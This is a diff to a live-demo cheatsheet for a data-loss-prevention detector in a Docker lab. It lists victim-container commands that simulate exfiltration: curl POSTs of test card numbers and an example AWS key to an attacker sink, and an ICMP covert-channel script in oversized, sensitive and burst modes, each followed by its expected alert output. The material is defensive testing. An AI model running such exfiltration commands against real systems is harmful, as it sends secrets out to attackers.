@@ -1,4 +1,4 @@
-# DLPDetection — Live Demo Cheatsheet
+# DLPDetection - Live Demo Cheatsheet
 
 ## Setup Prerequisites
 1. Start the stack: `docker compose up -d`
@@ -36,10 +36,7 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "card=4111-111
 docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOSFODNN7EXAMPLE"
 ```
 
-
-- **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs.
-
-
+- **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs, nothing received on Attacker sink.
 
 
 ## 2. Covert Channel Scenarios (L3/L4 ICMP)
@@ -53,7 +50,6 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
 - **Expected:** Normal packet debug logs in `covert-detector`, **0 DLP alerts** triggered.
 
 
-
 ### 2.2 Naive Bulk Exfiltration (Oversized Payload)
 
 - **Command (Victim):**
@@ -61,14 +57,12 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
   docker compose exec victim python attacks/icmp_exfiltrate.py --mode oversized
   ```
 
-
 - **Expected Alert in `covert-detector`:**
-  ```json
-  [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_oversized_payload", "severity": "high", "details": {"payload_size": 100, "threshold": 64}}
-  ```
-
-
-
+  ╭─ ⚠  HIGH icmp_oversized_payload  ALLOWED  ──────────────────────────────╮
+  │    Flow  172.20.0.3 → 172.21.0.10  (X:X:X · covert_icmp)                │
+  │   Alert  Payload size (X bytes) exceeds standard threshold (64 bytes)   │
+  │ Details  payload_size=X   threshold=64                                  │
+  ╰─────────────────────────────────────────────────────────────────────────╯
 
 
 ### 2.3 Sensitive Data Exfiltration (L7 Inspection inside ICMP)
@@ -78,14 +72,13 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
   docker compose exec victim python attacks/icmp_exfiltrate.py --mode sensitive --data "4532015112830366"
   ```
 
-
 - **Expected Alert in `covert-detector`:**
-  ```json
-  [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_sensitive_data_luhn_cc", "severity": "high", "details": {"matched": "4532015112830366", "detector": "luhn"}}
-  ```
-
-
-
+  ╭─ ⚠  HIGH icmp_sensitive_data_luhn_cc  ALLOWED  ──────────────────────────────╮
+  │    Flow  172.20.0.3 → 172.21.0.10  (XX:XX:XX · covert_icmp)                  │
+  │   Alert  Sensitive content detected in ICMP payload via rule 'luhn_cc'       │
+  │ Details  matched=XXXXXXXXXXXXXXXX   detector=luhn   source=icmp_payload      │
+  │          l7_rule_id=luhn_cc   digits=XX   issuing_network=XXXX               │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
 
 
 ### 2.4 Rapid Exfiltration Burst (Behavioral Rate Limiting)
@@ -95,8 +88,16 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
   docker compose exec victim python attacks/icmp_exfiltrate.py --mode burst --count 6 --delay 0.05
   ```
 
-
 - **Expected Alert in `covert-detector`:**
-  ```json
-  [DLP-ALERT] {"channel": "covert_icmp", "rule_id": "icmp_high_frequency", "severity": "high", "details": {"count": 5, "window_seconds": 1.0, "threshold": 4}}
-  ```
+  ╭─ ⚠  HIGH icmp_high_frequency  ALLOWED  ──────────────────────────────────────╮
+  │    Flow  172.20.0.3 → 172.21.0.10  (XX:XX:XX · covert_icmp)                  │
+  │   Alert  Abnormal ICMP Echo frequency: 5 requests in 1.0s from 172.20.0.3    │
+  │          (threshold: 4)                                                      │
+  │ Details  count=5   window_seconds=1.0   threshold=4   source_ip=172.20.0.3   │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
+  ╭─ ⚠  HIGH icmp_high_frequency  ALLOWED  ──────────────────────────────────────╮
+  │    Flow  172.20.0.3 → 172.21.0.10  (XX:XX:XX · covert_icmp)                  │
+  │   Alert  Abnormal ICMP Echo frequency: 6 requests in 1.0s from 172.20.0.3    │
+  │          (threshold: 4)                                                      │
+  │ Details  count=6   window_seconds=1.0   threshold=4   source_ip=172.20.0.3   │
+  ╰──────────────────────────────────────────────────────────────────────────────╯
